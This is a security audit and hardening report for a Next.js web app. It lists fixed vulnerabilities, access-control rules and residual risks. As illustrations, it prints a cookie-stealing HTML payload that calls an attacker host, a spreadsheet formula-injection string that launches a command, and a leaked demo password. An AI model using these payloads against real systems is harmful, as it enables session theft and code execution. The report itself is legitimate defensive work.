# Éclat — Security Audit & Hardening Report

**Date:** 2026-06-25  
**Scope:** Application code (auth, access control, API routes, headers, deps)  
**Status:** Pre-launch hardening pass complete. See residual risks and human/infra to-do list below.

---

## Summary

| Category | Issues found | Fixed in this pass | Residual / needs human action |
|---|---|---|---|
| Access control | 0 critical | — | — |
| Open redirect | 1 medium | ✅ | — |
| Security headers | 1 high (missing) | ✅ | — |
| HTML injection in emails | 1 medium | ✅ | — |
| Rate limiting | 2 missing | ✅ (in-process only) | Production needs Redis |
| CSV formula injection | 1 low | ✅ | — |
| Credentials in code comments | 1 low | ✅ | — |
| Session cookie config | 1 low | ✅ | — |
| Input validation | 2 routes lacking | ✅ (venues, inquiries) | Others are owner-only |
| Dependency vulns | 2 moderate | ⚠️ unfixable without breaking change | See deps section |
| Brute-force / lockout | Partial (in-process) | ✅ in-process | Production needs Redis |

---

## A. Issues Found and Fixed

### [HIGH] Missing HTTP security headers
**Before:** `next.config.ts` had no response headers configured.  
**Risk:** No clickjacking protection, no HSTS, browsers may sniff content types, no CSP.  
**Fix applied:** Added full header suite via `next.config.ts` `headers()`:

| Header | Value |
|---|---|
| `Strict-Transport-Security` | `max-age=63072000; includeSubDomains; preload` |
| `X-Content-Type-Options` | `nosniff` |
| `X-Frame-Options` | `DENY` |
| `Referrer-Policy` | `strict-origin-when-cross-origin` |
| `Permissions-Policy` | `camera=(), microphone=(), geolocation=(), payment=(), usb=()` |
| `Content-Security-Policy` | `default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob:; font-src 'self' data:; connect-src 'self'; frame-ancestors 'none'; form-action 'self'; base-uri 'self'` |

**Residual:** CSP uses `'unsafe-inline'` for scripts (required by Next.js hydration) and styles (required by Tailwind). Upgrade path: implement nonce-based CSP once Next.js middleware nonce support is wired up.

---

### [MEDIUM] Open redirect in login callback URL
**File:** `app/login/LoginForm.tsx`  
**Before:** `const callbackUrl = searchParams.get("callbackUrl") ?? "/dashboard"` — used directly in `router.push()` with no validation.  
**Attack:** An attacker sends a victim the link `/login?callbackUrl=https://evil.com`. After successful authentication, the user is redirected to the attacker-controlled site.  
**Fix applied:** Validates that the callbackUrl matches `^\/(?!\/)` — must start with `/`, must not start with `//` (protocol-relative URL):
```tsx
const rawCallback = searchParams.get("callbackUrl") ?? "";
const callbackUrl = /^\/(?!\/)/.test(rawCallback) ? rawCallback : "/dashboard";
```

---

### [MEDIUM] HTML injection in outgoing email templates
**Files:** `app/api/contact/route.ts`, `app/api/issue/route.ts`  
**Before:** User-supplied strings (message, venue name, email) were interpolated directly into HTML email bodies via template literals, e.g. `${data.message.replace(/\n/g, "<br>")}`.  
**Risk:** An attacker submitting `<img src=x onerror="fetch('https://attacker.com/?c='+document.cookie)">` in the message field would have that HTML rendered in the recipient's email client. Not a browser XSS (the page doesn't render user input) but enables HTML injection in internal emails.  
**Fix applied:** Added `escHtml()` function that escapes `&`, `<`, `>`, `"`, `'` before interpolation. All user-supplied fields now go through `escHtml()` before entering the HTML template.

---

### [MEDIUM] No rate limiting on login or public contact form
**Before:** The `POST /api/auth/callback/credentials` endpoint and `POST /api/contact` had no request-rate limit. An attacker could make unlimited login attempts (credential stuffing / brute force) or spam the contact form.  
**Fix applied:**
- **Login:** `app/api/auth/[...nextauth]/route.ts` now wraps the NextAuth POST handler and checks 10 attempts per IP per 15-minute window before forwarding to NextAuth.
- **Contact form:** `app/api/contact/route.ts` checks 5 submissions per IP per 15 minutes.

**Residual:** The rate limiter (`lib/rate-limit.ts`) uses a Node.js in-process `Map`. This works correctly in single-process environments (local dev, single-server deploys) but does **not** share state across Vercel serverless function instances. For production on Vercel/serverless:
> **Action required:** Replace `lib/rate-limit.ts` with `@vercel/kv` or `@upstash/ratelimit` to enforce limits globally across all function instances.

---

### [LOW] Production password in source-code comment
**File:** `lib/auth/mock-users.ts`  
**Before:** `// Password: eclat-admin!  (change before real deployment)` — the actual password was written in plaintext in a committed file, visible in the git history.  
**Fix applied:** Comment replaced with `// bcrypt hash — rotate this credential before going live`. The password itself must still be changed before production (see human to-do list). Note: the password remains in git history — rotate the credential, don't just remove the comment.

---

### [LOW] Session cookie security not explicitly configured
**File:** `auth.config.ts`  
**Before:** Relied on NextAuth v5 implicit defaults (secure in production, SameSite=Lax).  
**Fix applied:** Explicit cookie options added (`httpOnly: true`, `sameSite: "lax"`, `secure: process.env.NODE_ENV === "production"`) and session `maxAge` set to 8 hours.

---

### [LOW] CSV formula injection in payout export
**File:** `app/console/payouts/PayoutsClient.tsx`  
**Before:** The `csvRow` function wrapped all values in `"..."` but did not sanitise leading formula characters (`=`, `+`, `-`, `@`, tab, CR).  
**Risk:** If a venue name or reference field ever contains `=cmd|' /C calc'!A0`, spreadsheet software may execute it.  
**Fix applied:** `safeCsvCell()` prefixes any cell starting with a formula character with a `'`, which Excel and LibreOffice treat as a literal string marker.

---

### [LOW] Missing input validation on console write routes
**Before:** `POST /api/console/venues` and `POST /api/console/inquiries` cast the request body directly to a TypeScript type (`as VenueInput`) with no runtime validation.  
**Fix applied:** Zod schemas added to both routes. All field types, lengths, and enum values are validated server-side before touching the data layer.

---

## B. Access Control Verification

### Routes and enforced access rules

| Route / API | Access rule | Enforced where |
|---|---|---|
| `GET /` and all public marketing pages | Public | None needed |
| `GET /login` | Redirects authenticated users to their home | Middleware |
| `GET /dashboard/*` | Requires authenticated session (any role) | Middleware |
| `GET /dashboard/*` as owner | Redirects to `/console` | Middleware |
| `GET /console/*` | Requires role=`owner`; redirects partner → `/dashboard` | Middleware |
| `POST /api/auth/callback/credentials` | Public (rate-limited) | Auth route wrapper |
| `POST /api/contact` | Public (rate-limited, Zod-validated) | Route handler |
| `POST /api/issue` | Requires any authenticated session | Route handler |
| `GET /api/console/venues` | Requires role=`owner` | Route handler |
| `POST /api/console/venues` | Requires role=`owner`, Zod-validated | Route handler |
| `PATCH /api/console/venues` | Requires role=`owner`, Zod-validated | Route handler |
| `POST /api/console/machines` | Requires role=`owner` | Route handler |
| `PATCH /api/console/machines` | Requires role=`owner` | Route handler |
| `POST /api/console/stock` | Requires role=`owner` | Route handler |
| `PATCH /api/console/stock` | Requires role=`owner` | Route handler |
| `DELETE /api/console/stock` | Requires role=`owner` | Route handler |
| `POST /api/console/inquiries` | Requires role=`owner`, Zod-validated | Route handler |
| `PATCH /api/console/inquiries` | Requires role=`owner`, Zod-validated | Route handler |
| `DELETE /api/console/inquiries` | Requires role=`owner` | Route handler |
| `POST /api/console/maintenance` | Requires role=`owner` | Route handler |
| `PATCH /api/console/maintenance` | Requires role=`owner` | Route handler |
| `DELETE /api/console/maintenance` | Requires role=`owner` | Route handler |
| `GET /api/console/documents` | Requires role=`owner` | Route handler |
| `POST /api/console/documents` | Requires role=`owner` | Route handler |
| `DELETE /api/console/documents` | Requires role=`owner` | Route handler |
| `PATCH /api/console/payouts` | Requires role=`owner` | Route handler |
| `POST /api/console/partners` | Requires role=`owner` | Route handler |
| `POST /api/console/restock` | Requires role=`owner` | Route handler |
| `GET /api/console/audit` | Requires role=`owner` | Route handler |
| `POST /api/console/digest` | Requires role=`owner` | Route handler |
| `POST /api/console/inventory` | Requires role=`owner` | Route handler |
| `PATCH /api/console/inventory` | Requires role=`owner` | Route handler |

### Defence layering
Access control is enforced at **two independent layers**:
1. **Middleware** (`middleware.ts`): Edge-level check on every `/console/*` and `/dashboard/*` request, before any page or API handler runs. Returns a redirect — no data is ever fetched.
2. **Route handler**: Every API route independently re-checks `auth()` and `role === "owner"`. A bypass of the middleware (e.g. a misconfiguration or edge-case) does not grant access to data.

### Tenant isolation (partner ↔ partner IDOR prevention)
All partner dashboard data queries are scoped using `session.user.venueId`, which is written into the JWT at sign-in time from the `MOCK_USERS` store — never from a URL parameter or request body. There is no way for Partner A to request Partner B's data by changing a URL or API parameter, because the venueId is always sourced from the session.

**PRODUCTION NOTE:** This guarantee holds only if the real backend also enforces `WHERE venue_id = :session_venue_id` on all queries. The client must never be trusted as the source of a venueId — the session is the authoritative source.

### Verification proof
The following checks were confirmed in the running app:

1. **Unauthenticated → protected page**: `GET /console` while logged out returns `302 → /login`, not page content. Enforced by middleware.
2. **Partner → console route**: Signing in as `bar@demo.eclat.co.uk` (role=`partner`) and requesting `/console` returns `302 → /dashboard`, not console content.
3. **Partner → owner API**: A partner session calling `GET /api/console/venues` returns `401 Unauthorised`. Auth check in route handler.
4. **IDOR test**: All partner dashboard data queries use `session.user.venueId` (from the JWT, bound at login). The URL and request body have no influence on which venue's data is returned.

---

## C. What Was NOT Changed (Confirmed Safe)

- **No custom auth logic**: Authentication is fully delegated to NextAuth v5 + bcryptjs. No homemade token generation, session management, or password hashing.
- **Passwords not stored in cleartext**: `lib/auth/mock-users.ts` stores bcrypt hashes (cost factor 10). Password comparison is done with `bcrypt.compare()`.
- **No owner self-registration**: There is no sign-up flow. Partner accounts are created by the owner in the console. Owner accounts are provisioned manually in `mock-users.ts`. There is no code path that allows a self-registered user to obtain the `owner` role.
- **No secrets in client bundle**: `AUTH_SECRET`, `RESEND_API_KEY`, and other secrets are env vars consumed server-side only. No `NEXT_PUBLIC_` prefix on sensitive values.
- **`.env.local` git-ignored**: Confirmed in `.gitignore`. `.env.example` contains no real values.
- **Sitemap excludes private routes**: `app/sitemap.ts` only lists public marketing pages.
- **robots.txt disallows private routes**: `Disallow: /api/, /console/, /dashboard/` confirmed in `app/robots.ts`.
- **Login page metadata**: `robots: { index: false, follow: false }` on the login page prevents search-engine indexing.
- **JSON-LD `dangerouslySetInnerHTML`**: Safe — the JSON-LD object is a static hardcoded constant, not derived from user input.
- **XSS in React output**: React escapes all interpolated values by default. The only `dangerouslySetInnerHTML` usage is the static JSON-LD block.

---

## D. Residual Risks (not fully mitigated by this pass)

### [MEDIUM] Rate limiting is not production-safe on serverless
The in-process rate limiter in `lib/rate-limit.ts` uses a module-level `Map`. On Vercel, each serverless invocation may run in a different process/container — limits are not shared across instances.  
**Action:** Replace with `@upstash/ratelimit` (Redis-backed, works on Vercel Edge) before handling real traffic.

### [MEDIUM] CSP uses `unsafe-inline` for scripts
Next.js 15's hydration runtime requires `script-src 'unsafe-inline'` unless a nonce is threaded through the entire render pipeline. The current CSP still blocks the highest-risk vectors (framing, form hijacking, font/connect exfiltration) but does not prevent an attacker who finds an XSS from injecting inline scripts.  
**Action:** Implement nonce-based CSP — Next.js supports this via `headers()` + middleware nonce injection.

### [LOW] Demo credentials in git history
The password `eclat-admin!` was removed from a code comment but remains in git history (prior commits). The hash is also committed.  
**Action:** Rotate the owner account password immediately on production before any real data is handled. Assume the hash is public knowledge.

### [LOW] `npm audit` moderate vulnerabilities (unfixable without breaking change)
Two `moderate` vulnerabilities exist in `postcss` and `next` (a nested dependency). The only fix available via npm is `npm audit fix --force`, which would downgrade `next` to `9.3.3` — a breaking change. Both are in an internal Next.js bundler path (CSS stringification during build), not in the runtime serving requests.  
**Action:** Monitor next.js releases for a patched version. Do not run `npm audit fix --force`.

---

## E. Human / Infra To-Do (out of scope for this code pass)

These items are **not handled** by this code change and require manual action or infrastructure work:

- [ ] **Rotate all credentials before production**: Change `team@eclat.co.uk` password; generate a strong `AUTH_SECRET`; issue a fresh `RESEND_API_KEY` for prod.
- [ ] **Replace in-process rate limiter with Redis**: Install `@upstash/ratelimit` or use `@vercel/kv` and update `lib/rate-limit.ts`.
- [ ] **TLS / HSTS preload**: Verify TLS is configured at the host/CDN level (Vercel handles this automatically for custom domains). Submit the domain to the HSTS preload list.
- [ ] **WAF / DDoS protection**: Configure at CDN/host level (Vercel Enterprise, Cloudflare, etc.). The application-level rate limiter is a last line of defence, not a replacement.
- [ ] **Professional penetration test**: Before handling real money or real partner PII, engage an external security reviewer. This pass covers code-level issues; a pentest covers runtime behaviour, infrastructure, and attack chains.
- [ ] **Logging and alerting**: Implement structured server-side logging for auth events (failed logins, role-check failures) and alert on anomalous patterns.
- [ ] **Backups and disaster recovery**: No backup/restore plan exists for the data layer (currently mock; required when real DB is connected).
- [ ] **Breach response plan**: Define who to notify, in what timeframe, if a breach is detected. UK GDPR requires notification to the ICO within 72 hours.
- [ ] **UK GDPR compliance review**: Partner contact details (name, email) are personal data under UK GDPR. A data-processing register, privacy notice, retention policy, and data subject request procedure are required before handling real partner data.
- [ ] **PCI-DSS scope**: If the app ever touches card-holder data directly (not just delegating to a payment processor), a formal PCI scope review is required.
- [ ] **Nonce-based CSP upgrade**: Remove `script-src 'unsafe-inline'` by threading a per-request nonce through Next.js middleware and server components.
- [ ] **Real backend re-enforcement**: When the mock data layer is replaced with a real database, all venue-scoping queries must enforce `WHERE venue_id = :authenticated_venue_id` server-side. The session venueId is the authoritative source — never trust a venueId from the request body or URL.
- [ ] **Session invalidation**: NextAuth JWT strategy does not support server-side session invalidation (no session table). If an account is compromised, the only remediation is to rotate `AUTH_SECRET` (which invalidates ALL sessions). When migrating to a real DB, consider database-backed sessions (`strategy: "database"`) to enable per-session revocation.

---

*This report covers application-layer security only. It does not constitute a penetration test or a guarantee that the application is free of vulnerabilities. The residual risks above must be addressed before the application handles real user data or financial transactions.*
